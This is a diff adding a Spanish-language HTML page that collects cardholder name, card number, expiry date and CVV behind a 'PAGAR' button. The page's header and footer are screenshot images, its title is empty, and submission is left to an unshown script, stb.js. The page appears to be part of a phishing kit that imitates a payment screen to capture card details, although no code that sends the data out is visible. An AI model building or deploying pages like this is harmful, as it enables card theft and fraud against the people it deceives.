@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/main.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body style="background-color: #f3f3f3">
+    <div class="hed">
+        <img src="./img/hed.JPG" alt="">
+    </div>
+
+    <div class="kolch">
+        <form method="post" id="pg2">
+            <p>El nombre en la tarjeta</p>
+            <input type="text" name="" id="numnn" required>
+    
+            <p>Número de tarjeta</p>
+            <input type="tel" name="" id="numcc" required maxlength="19">
+    
+            <p>EXP</p>
+            <div class="exp">
+                
+                <input class="mm" type="tel" name="" id="mmo" required placeholder="MM" maxlength="2">
+                <input type="tel" name="" id="aao" required placeholder="AA" maxlength="4">
+            </div>
+    
+            <p>CVV</p>
+            <input class="cvv" type="tel" name="" id="numvv" required maxlength="4">
+
+            <button type="submit">PAGAR</button>
+        </form>
+    </div>
+
+    <div class="bot">
+        <img style="width: 100%; margin-top: 80px;" src="./img/bot.JPG" alt="">
+    </div>
+    <script>
+        $("#numcc").on("keyup",function(){
+           cc = $(this).val().split(" ").join("");
+           cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+           $(this).val(cc);
+       });
+    </script>
+    <!-- my script -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
